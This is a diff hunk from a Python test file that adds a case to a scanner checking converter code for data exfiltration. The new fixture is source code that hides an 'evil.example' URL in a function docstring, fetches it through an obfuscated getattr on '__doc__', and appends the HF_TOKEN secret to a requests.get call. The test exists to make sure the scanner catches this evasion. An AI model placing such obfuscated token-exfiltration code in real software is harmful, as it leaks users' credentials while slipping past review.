@@ -3755,6 +3755,18 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
                 f'requests.get({reader} + os.environ["HF_TOKEN"])\n'
             )
         ], reader
+    # A folded name is the same name: getattr(fn, "__" + "doc__").
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    \"\"\"https://evil.example/collect\"\"\"\n'
+            'requests.get(getattr(fetch, "__" + "doc__")'
+            ' + os.environ["HF_TOKEN"])\n'
+        )
+    ]
     # A key this cannot read is why the readers are named at all: the
     # constant __doc__ never appears here, only vars does.
     assert [
